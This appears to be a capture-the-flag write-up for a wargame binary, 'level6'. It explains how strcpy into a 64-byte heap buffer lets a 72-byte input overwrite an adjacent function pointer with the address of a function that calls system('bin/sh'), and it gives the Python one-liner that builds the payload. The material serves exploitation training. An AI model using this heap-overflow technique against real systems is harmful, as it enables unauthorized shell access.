# LEVEL6

## EXPLANATIONS
### BINARY BEHAVIOR
- function main, m and n(n never called and m is called threw a pointer on func stored in buf2  
    - <\main\> 
        - allocated 2 buff one of 64 and one of 4 bytes  
        - strcpy argv[1] in buf1
    - \<m\>
        - puts("Nope")
    - \<n\>
        - system("bin/sh")

### EXPLOI STRATEGY
Printing heap from buf1 addr, we see that buf2 is 72 bytes further in the addresses.
As strcpy does not copy a given number of characters, we did a heap overflow to write address of n at buf2 heap memory location.
	=> argv1 is copied to buf1 which overflows into buf2
### RUN COMMAND
```
python -c "print('A' * 72 + '\x08\x04\x84\x54'[::-1])" > /tmp/argv1_string
/home/user/level6/level6 $(cat /tmp/argv1_string)
```